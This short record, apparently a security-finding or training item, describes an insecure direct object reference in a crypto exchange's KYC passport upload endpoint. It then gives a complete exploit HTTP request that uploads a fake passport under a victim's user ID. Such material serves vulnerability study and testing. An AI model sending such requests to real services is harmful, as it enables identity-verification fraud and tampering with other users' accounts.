diagnosis: The KYC upload handler authenticates the user via authenticateToken, but associates the uploaded passport image with targetUserId supplied in the multipart form body instead of req.user.id. An attacker can overwrite identity verification documents of other users with fraudulent passports to bypass KYC or corrupt account compliance.
exploit_request:
POST /api/kyc/passport/upload HTTP/1.1
Host: crypto.exchange.com
Authorization: Bearer <attacker_jwt>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXyZ

------WebKitFormBoundaryXyZ
Content-Disposition: form-data; name="targetUserId"

usr_victim_crypto_whale_01
------WebKitFormBoundaryXyZ
Content-Disposition: form-data; name="document"; filename="fake_passport.jpg"
Content-Type: image/jpeg

<fake_image_data>
------WebKitFormBoundaryXyZ--
